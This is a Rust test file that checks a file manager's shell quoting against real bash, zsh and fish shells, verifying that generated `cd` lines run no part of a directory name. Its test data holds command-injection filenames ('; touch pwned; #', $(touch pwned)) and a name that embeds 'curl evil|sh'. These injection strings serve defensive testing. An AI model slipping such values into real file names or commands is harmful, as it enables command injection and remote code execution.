//! Round-trips the command-line quoting through the *real* bash, zsh and fish (each test
//! skips when the shell is not installed): the exact `cd` line OFM feeds on a panel→shell
//! sync must land the shell in the directory byte-exactly and must never execute part of the
//! name (the fish injection `\'; touch pwned; #`), and names quoted for the command line must
//! expand back to the original bytes, control bytes included.

#![allow(clippy::unwrap_used, clippy::expect_used)]
#![cfg(unix)]

use std::ffi::{OsStr, OsString};
use std::os::unix::ffi::{OsStrExt, OsStringExt};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use ofm_core::cmdline::{QuoteStyle, cd_command_for, has_control_bytes, shell_quote_for};

fn have(shell: &str) -> bool {
    Command::new(shell)
        .arg("--version")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .is_ok_and(|s| s.success())
}

struct Scratch(PathBuf);

impl Scratch {
    fn new(tag: &str) -> Scratch {
        let p = std::env::temp_dir().join(format!("ofm-quote-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        Scratch(p)
    }
}

impl Drop for Scratch {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn style_of(shell: &str) -> QuoteStyle {
    if shell == "fish" {
        QuoteStyle::Fish
    } else {
        QuoteStyle::Posix
    }
}

/// Directory names without control bytes (cd sync refuses those, see below).
fn cd_names() -> Vec<OsString> {
    let mut v: Vec<OsString> = [
        "plain",
        "sp ace",
        "it's",
        "dou\"ble",
        "back\\slash",
        "\\",
        "\\'",
        "\\'; touch pwned; #",
        "'; touch pwned; #",
        "x\\' ; touch pwned ; echo \\'",
        "$HOME",
        "$(touch pwned)",
        "`touch pwned`",
        "*",
        "(paren)",
        "a;b&c|d",
        "!bang",
        "~",
        "-rf",
        "київ",
        "emoji-😀",
    ]
    .iter()
    .map(OsString::from)
    .collect();
    v.push(OsString::from_vec(vec![b'x', 0xff, b'y']));
    v
}

#[test]
fn cd_command_lands_byte_exact_and_executes_nothing() {
    for shell in ["bash", "zsh", "fish"] {
        if !have(shell) {
            eprintln!("skipping {shell}: not installed");
            continue;
        }
        let sc = Scratch::new(&format!("cd-{shell}"));
        let work = sc.0.join("work"); // the shell's start directory: `touch pwned` would land here
        std::fs::create_dir_all(&work).unwrap();
        for name in cd_names() {
            let target = sc.0.join(&name);
            std::fs::create_dir(&target).unwrap();
            let line = cd_command_for(style_of(shell), &target).expect("no control bytes");
            let mut script = line;
            // `command pwd` prints the logical directory after the cd.
            script.extend_from_slice(b"command pwd\n");
            let out = Command::new(shell)
                .arg("-c")
                .arg(OsStr::from_bytes(&script))
                .current_dir(&work)
                .env("HOME", &work)
                .output()
                .unwrap();
            let mut want = target.as_os_str().as_bytes().to_vec();
            want.push(b'\n');
            assert_eq!(
                out.stdout,
                want,
                "{shell}: cd landed elsewhere for {name:?} (stderr: {})",
                String::from_utf8_lossy(&out.stderr)
            );
            assert!(
                !work.join("pwned").exists() && !sc.0.join("pwned").exists(),
                "{shell}: executed part of the name {name:?}"
            );
            std::fs::remove_dir(&target).unwrap();
        }
    }
}

#[test]
fn fish_injection_name_from_the_review_is_inert() {
    if !have("fish") {
        eprintln!("skipping: fish not installed");
        return;
    }
    // The exact name the reviewer reproduced: backslash, quote, then a command.
    let sc = Scratch::new("fish-inject");
    let name = OsString::from("\\'; touch pwned; #");
    let target = sc.0.join(&name);
    std::fs::create_dir(&target).unwrap();
    let line = cd_command_for(QuoteStyle::Fish, &target).unwrap();
    let out = Command::new("fish")
        .arg("-c")
        .arg(OsStr::from_bytes(&line))
        .current_dir(&sc.0)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(!sc.0.join("pwned").exists());
    // And the POSIX form really is wrong for fish (documents why the style exists).
    let posix = cd_command_for(QuoteStyle::Posix, &target).unwrap();
    let _ = Command::new("fish")
        .arg("-c")
        .arg(OsStr::from_bytes(&posix))
        .current_dir(&sc.0)
        .output()
        .unwrap();
    assert!(
        sc.0.join("pwned").exists(),
        "fish no longer treats the POSIX quoting as an injection; revisit QuoteStyle::Fish"
    );
}

#[test]
fn cd_command_refuses_names_with_control_bytes() {
    for bad in [
        &b"\x15curl evil|sh\n"[..],
        b"a\x03b",
        b"esc\x1b[A",
        b"del\x7f",
    ] {
        let p = Path::new("/tmp").join(OsStr::from_bytes(bad));
        assert!(has_control_bytes(p.as_os_str().as_bytes()));
        for style in [QuoteStyle::Posix, QuoteStyle::Fish] {
            assert_eq!(cd_command_for(style, &p), None);
        }
    }
}

/// Names for the command-line quoting (`insert_name`): control bytes included.
fn word_names() -> Vec<Vec<u8>> {
    let mut v: Vec<Vec<u8>> = cd_names().into_iter().map(OsString::into_vec).collect();
    v.extend([
        b"\x15curl evil|sh\n".to_vec(),
        b"nl\nin the middle".to_vec(),
        b"tab\there".to_vec(),
        b"esc\x1b[31mred".to_vec(),
        b"del\x7fx".to_vec(),
        b"\x03".to_vec(),
        b"q'uote\x15".to_vec(),
        b"bs\\\x15".to_vec(),
        b"\xff\x15\xfe".to_vec(),
        b"".to_vec(),
    ]);
    v
}

#[test]
fn quoted_words_expand_back_to_the_exact_bytes() {
    for shell in ["bash", "zsh", "fish"] {
        if !have(shell) {
            eprintln!("skipping {shell}: not installed");
            continue;
        }
        let style = style_of(shell);
        for name in word_names() {
            let quoted = shell_quote_for(style, OsStr::from_bytes(&name));
            assert!(
                !has_control_bytes(quoted.as_bytes()),
                "{shell}: control byte in the typed text for {name:?}"
            );
            let script = format!("printf %s {quoted}");
            let out = Command::new(shell).arg("-c").arg(&script).output().unwrap();
            assert_eq!(
                out.stdout,
                name,
                "{shell}: {script:?} expanded wrongly (stderr: {})",
                String::from_utf8_lossy(&out.stderr)
            );
        }
    }
}
